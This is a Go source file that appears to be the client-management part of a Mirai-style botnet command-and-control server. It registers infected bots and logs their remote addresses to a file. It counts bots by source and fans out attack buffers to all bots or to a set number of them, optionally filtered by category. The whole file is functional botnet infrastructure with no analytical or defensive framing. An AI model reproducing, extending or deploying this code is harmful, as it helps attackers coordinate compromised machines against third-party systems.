package main

import (
    "time"
    "math/rand"
    "sync"
    "fmt"
    "os"
)

type AttackSend struct {
    buf         []byte
    count       int
    botCata     string
}

type ClientList struct {
    uid         int
    count       int
    clients     map[int]*Bot
    addQueue    chan *Bot
    delQueue    chan *Bot
    atkQueue    chan *AttackSend
    totalCount  chan int
    cntView     chan int
    distViewReq chan int
    distViewRes chan map[string]int
    cntMutex    *sync.Mutex
}

var logFileName string

func NewClientList() *ClientList {
    c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
    go c.worker()
    go c.fastCountWorker()
    return c
}

func (this *ClientList) Count() int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()

    this.cntView <- 0
    return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    this.distViewReq <- 0
    return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) {
    currentTimeAdd := time.Now()
    formattedTimeAdd := currentTimeAdd.Format("2006-01-02 15:04:05")
    formattedTimeAddF := currentTimeAdd.Format("2006-01-02\t15:04:05")
    botCountAdd := this.Count()
    this.addQueue <- c

    file, err := os.OpenFile(logFileName,os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
    if err != nil{
        fmt.Println("Error opening file:",err)
        return
    }
    defer file.Close()
    fmt.Fprintf(file, "%s\t%d\tWhite\tAdd\t%s\n",formattedTimeAddF,botCountAdd, c.conn.RemoteAddr())
    
    fmt.Printf("%s num-%d Added   client %d - %s - %s\n",formattedTimeAdd,botCountAdd, c.version, c.source, c.conn.RemoteAddr())
}

func (this *ClientList) DelClient(c *Bot) {
    currentTimeDel := time.Now()
    formattedTimeDel := currentTimeDel.Format("2006-01-02 15:04:05")
    formattedTimeDelF := currentTimeDel.Format("2006-01-02\t15:04:05")
    botCountDel := this.Count()
    this.delQueue <- c

    file, err := os.OpenFile(logFileName,os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
    if err != nil{
        fmt.Println("Error opening file:",err)
        return
    }
    defer file.Close()
    fmt.Fprintf(file, "%s\t%d\tWhite\tDel\t%s\n",formattedTimeDelF,botCountDel, c.conn.RemoteAddr())
    
    fmt.Printf("%s num-%d Deleted client %d - %s - %s\n",formattedTimeDel,botCountDel, c.version, c.source, c.conn.RemoteAddr())
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
    attack := &AttackSend{buf, maxbots, botCata}
    this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
    for {
        select {
        case delta := <-this.totalCount:
            this.count += delta
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        }
    }
}

func (this *ClientList) worker() {
    rand.Seed(time.Now().UTC().UnixNano())

    for {
        select {
        case add := <-this.addQueue:
            this.totalCount <- 1
            this.uid++
            add.uid = this.uid
            this.clients[add.uid] = add
            break
        case del := <-this.delQueue:
            this.totalCount <- -1
            delete(this.clients, del.uid)
            break
        case atk := <-this.atkQueue:
            if atk.count == -1 {
                for _,v := range this.clients {
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                    }
                }
            } else {
                var count int
                for _, v := range this.clients {
                    if count > atk.count {
                        break
                    }
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                        count++
                    }
                }
            }
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        case <-this.distViewReq:
            res := make(map[string]int)
            for _,v := range this.clients {
                if ok,_ := res[v.source]; ok > 0 {
                    res[v.source]++
                } else {
                    res[v.source] = 1
                }
            }
            this.distViewRes <- res
        }
    }
}

